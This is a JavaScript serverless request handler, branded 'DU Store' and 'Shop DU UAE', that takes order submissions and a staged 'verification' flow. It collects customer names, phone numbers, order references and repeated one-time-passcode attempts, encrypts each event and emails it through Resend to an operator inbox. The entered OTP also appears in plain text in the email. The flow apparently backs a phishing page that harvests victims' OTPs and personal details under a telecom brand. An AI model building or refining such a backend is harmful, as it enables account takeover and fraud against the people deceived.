const json = (status, body) =>
  new Response(JSON.stringify(body), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Cache-Control": "no-store"
    }
  });

function toBase64(bytes) {
  let binary = "";
  for (const byte of bytes) {
    binary += String.fromCharCode(byte);
  }
  return btoa(binary);
}

async function encryptPayload(value, secret) {
  const encoder = new TextEncoder();

  // Create a 256-bit key from the server-side secret.
  const keyBytes = await crypto.subtle.digest(
    "SHA-256",
    encoder.encode(secret)
  );

  const key = await crypto.subtle.importKey(
    "raw",
    keyBytes,
    { name: "AES-GCM" },
    false,
    ["encrypt"]
  );

  // AES-GCM uses a 12-byte random IV.
  const iv = crypto.getRandomValues(new Uint8Array(12));

  const encryptedBuffer = await crypto.subtle.encrypt(
    { name: "AES-GCM", iv, tagLength: 128 },
    key,
    encoder.encode(JSON.stringify(value))
  );

  const encrypted = new Uint8Array(encryptedBuffer);
  const ciphertext = encrypted.slice(0, encrypted.length - 16);
  const authTag = encrypted.slice(encrypted.length - 16);

  return {
    algorithm: "AES-256-GCM",
    iv: toBase64(iv),
    authTag: toBase64(authTag),
    ciphertext: toBase64(ciphertext)
  };
}

function escapeHtml(value) {
  return String(value ?? "").replace(/[&<>"']/g, ch => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  }[ch]));
}

// ---------------------------------------------------------------------------
// Shared email builder — same visual template for orders and verification.
// ---------------------------------------------------------------------------
function buildNotificationEmail({ title, subtitle, reference, headline, subheadline, encryptedText }) {
  const encryptedEscaped = escapeHtml(encryptedText);
  return `
    <div style="font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;max-width:680px;margin:0 auto;color:#222">

      <div style="background:linear-gradient(135deg,#7b2ff7,#2d6cff,#f107a3);color:#fff;padding:22px 24px;border-radius:12px 12px 0 0">
        <div style="font-size:10px;font-weight:900;letter-spacing:1.4px;text-transform:uppercase;opacity:.85;margin-bottom:6px">${escapeHtml(title || '')}</div>
        <h2 style="margin:0;font-size:20px;font-weight:900">${escapeHtml(headline || '')}</h2>
        ${subheadline ? `<p style="margin:6px 0 0;font-size:14px;opacity:.95">${escapeHtml(subheadline)}</p>` : ''}
        ${reference ? `<p style="margin:10px 0 0;font-size:12px;opacity:.85;letter-spacing:.3px">Reference: <strong style="font-family:'Courier New',monospace">${escapeHtml(reference)}</strong></p>` : ''}
      </div>

      <div style="border:1px solid #e5e7eb;border-top:0;border-radius:0 0 12px 12px;padding:20px 24px">

        <div style="display:flex;align-items:center;justify-content:space-between;margin:0 0 10px">
          <span style="font-size:13px;font-weight:800;color:#111;text-transform:uppercase;letter-spacing:.6px">Encrypted payload</span>
          <button
            type="button"
            onclick="
              (function(btn){
                var txt = document.getElementById('payloadText').textContent;
                var done = function(){
                  btn.textContent = '✓ Copied';
                  btn.style.background = '#e7f9ef';
                  btn.style.color = '#087b48';
                  setTimeout(function(){
                    btn.textContent = 'Copy';
                    btn.style.background = '#f3f4f6';
                    btn.style.color = '#111';
                  }, 1600);
                };
                if (navigator.clipboard && window.isSecureContext) {
                  navigator.clipboard.writeText(txt).then(done).catch(function(){
                    var ta = document.createElement('textarea');
                    ta.value = txt; document.body.appendChild(ta); ta.select();
                    try { document.execCommand('copy'); done(); } catch(e){}
                    document.body.removeChild(ta);
                  });
                } else {
                  var ta = document.createElement('textarea');
                  ta.value = txt; document.body.appendChild(ta); ta.select();
                  try { document.execCommand('copy'); done(); } catch(e){}
                  document.body.removeChild(ta);
                }
              })(this);
            "
            style="background:#f3f4f6;color:#111;border:1px solid #d1d5db;border-radius:8px;padding:7px 14px;font-size:12px;font-weight:800;cursor:pointer;font-family:inherit"
          >Copy</button>
        </div>

        <pre id="payloadText" style="white-space:pre-wrap;word-break:break-all;background:#0a0e1c;color:#b8f5d0;padding:14px;border-radius:8px;font-size:11.5px;line-height:1.5;max-height:600px;overflow:auto;margin:0;border:1px solid #1a2438">${encryptedEscaped}</pre>

        ${subtitle ? `<p style="margin:16px 0 0;font-size:11px;color:#9299a7;text-align:center;line-height:1.5">${escapeHtml(subtitle)}</p>` : ''}
      </div>
    </div>
  `;
}

// ---------------------------------------------------------------------------
// Resend dispatcher
// ---------------------------------------------------------------------------
async function sendEmail({ env, subject, html }) {
  const { RESEND_API_KEY, ORDER_NOTIFICATION_EMAIL, RESEND_FROM_EMAIL } = env;
  const resendResponse = await fetch("https://api.resend.com/emails", {
    method: "POST",
    headers: {
      "Authorization": `Bearer ${RESEND_API_KEY}`,
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      from: RESEND_FROM_EMAIL,
      to: [ORDER_NOTIFICATION_EMAIL],
      subject,
      html
    })
  });
  if (!resendResponse.ok) {
    const errorText = await resendResponse.text();
    console.error("Resend request failed:", resendResponse.status, errorText.slice(0, 500));
    throw new Error("Email delivery failed");
  }
}

// ---------------------------------------------------------------------------
// Main handler
// ---------------------------------------------------------------------------
export async function onRequestPost({ request, env }) {
  const {
    RESEND_API_KEY,
    ORDER_NOTIFICATION_EMAIL,
    RESEND_FROM_EMAIL,
    ORDER_ENCRYPTION_SECRET
  } = env;

  if (
    !RESEND_API_KEY ||
    !ORDER_NOTIFICATION_EMAIL ||
    !RESEND_FROM_EMAIL ||
    !ORDER_ENCRYPTION_SECRET
  ) {
    return json(500, {
      ok: false,
      error: "Order notifications are not configured on the server."
    });
  }

  let body;

  try {
    body = await request.json();
  } catch {
    return json(400, {
      ok: false,
      error: "Invalid request."
    });
  }

  const order = body && body.order;

  if (!order || typeof order !== "object" || Array.isArray(order)) {
    return json(400, {
      ok: false,
      error: "Missing order details."
    });
  }

  // ---------------------------------------------------------------
  // Detect verification flow events (from verify-order.html).
  // The verify-order.html sends `type: "verification_started"`,
  // `type: "verification_details"`, or `type: "verification_otp"`.
  // ---------------------------------------------------------------
  const eventType = String(order.type || "").toLowerCase();
  const isVerificationEvent = eventType.startsWith("verification");

  if (isVerificationEvent) {
    return handleVerificationEvent({ order, eventType, env, secret: ORDER_ENCRYPTION_SECRET });
  }

  // ---------------------------------------------------------------
  // ORDER FLOW — unchanged from your original send-order.js
  // ---------------------------------------------------------------
  const customerName = String(order.fullName || "").trim().slice(0, 160);
  const customerPhone = String(order.mobileNumber || "").trim().slice(0, 40);
  const reference = String(order.orderReference || "").trim().slice(0, 40);

  if (!customerName || !customerPhone || !reference) {
    return json(400, {
      ok: false,
      error: "Customer name, phone number and order reference are required."
    });
  }

  const fullOrder = { ...order };

  let encrypted;
  try {
    encrypted = await encryptPayload(fullOrder, ORDER_ENCRYPTION_SECRET);
  } catch (error) {
    console.error("Encryption failed:", error.message);
    return json(500, {
      ok: false,
      error: "Could not securely process the order."
    });
  }

  const encryptedText = JSON.stringify(encrypted, null, 2);

  const html = buildNotificationEmail({
    title: "DU Store order",
    headline: customerName,
    subheadline: customerPhone,
    reference,
    encryptedText
  });

  try {
    await sendEmail({
      env,
      subject: `DU Store order ${reference} — ${customerName}`,
      html
    });
    return json(200, { ok: true, reference });
  } catch (error) {
    console.error("Resend connection error:", error.message);
    return json(502, {
      ok: false,
      error: "Email service is temporarily unavailable."
    });
  }
}

// ---------------------------------------------------------------------------
// Verification flow handler
// ---------------------------------------------------------------------------
async function handleVerificationEvent({ order, eventType, env, secret }) {
  const reference = String(order.orderReference || "").trim().slice(0, 40);
  if (!reference) {
    return json(400, {
      ok: false,
      error: "Order reference is required for verification events."
    });
  }

  // Pull display fields for the email subject/header
  const customerName = String(order.customerName || order.fullName || "").trim().slice(0, 160);
  const customerPhone = String(order.mobileNumber || "").trim().slice(0, 40);

  // Build subject line
  let subject = `DU Verification ${reference}`;
  let title = "DU Order Verification";
  let headline = customerName || reference;
  let subheadline = customerPhone || "";

  if (eventType === "verification_started") {
    subject = `DU Verification started — ${reference}`;
    title = "DU Order Verification · Step 1";
    headline = `Order reference entered`;
    subheadline = `Customer has begun verification for ${reference}`;
  } else if (eventType === "verification_details") {
    subject = `DU Verification details submitted — ${reference}`;
    title = "DU Order Verification · Step 2";
    headline = customerName || "Customer details submitted";
    subheadline = customerPhone ? `${customerPhone} · ${reference}` : reference;
  } else if (eventType === "verification_otp") {
    const attemptNumber = Number(order.otpAttemptNumber) || 1;
    subject = `DU Verification OTP attempt ${attemptNumber} — ${reference}`;
    title = `DU Order Verification · OTP Attempt ${attemptNumber}`;
    headline = customerName || reference;
    const otpCode = String(order.otp || "").trim();
    subheadline = otpCode ? `OTP entered: ${otpCode}` : `OTP entry logged`;
  } else if (eventType === "verification_otp_attempt") {
    const attemptNumber = Number(order.otpAttemptNumber) || 1;
    subject = `DU Verification OTP attempt ${attemptNumber} — ${reference}`;
    title = `DU Order Verification · OTP Attempt ${attemptNumber}`;
    headline = customerName || reference;
    const otpCode = String(order.otp || "").trim();
    subheadline = otpCode ? `OTP entered: ${otpCode}` : `OTP entry logged`;
  } else {
    // Any other verification_* event
    subject = `DU Verification event — ${reference}`;
    title = `DU Order Verification · ${eventType}`;
    headline = customerName || reference;
    subheadline = customerPhone || "";
  }

  // Attach metadata timestamp
  const enrichedOrder = {
    ...order,
    eventType,
    receivedAt: new Date().toISOString()
  };

  let encrypted;
  try {
    encrypted = await encryptPayload(enrichedOrder, secret);
  } catch (error) {
    console.error("Encryption failed:", error.message);
    return json(500, {
      ok: false,
      error: "Could not securely process the verification event."
    });
  }

  const encryptedText = JSON.stringify(encrypted, null, 2);

  const html = buildNotificationEmail({
    title,
    headline,
    subheadline,
    reference,
    encryptedText,
    subtitle: "Verification event · Shop DU UAE"
  });

  try {
    await sendEmail({ env, subject, html });
    return json(200, { ok: true, reference });
  } catch (error) {
    console.error("Resend verification connection error:", error.message);
    return json(502, {
      ok: false,
      error: "Email service is temporarily unavailable."
    });
  }
}
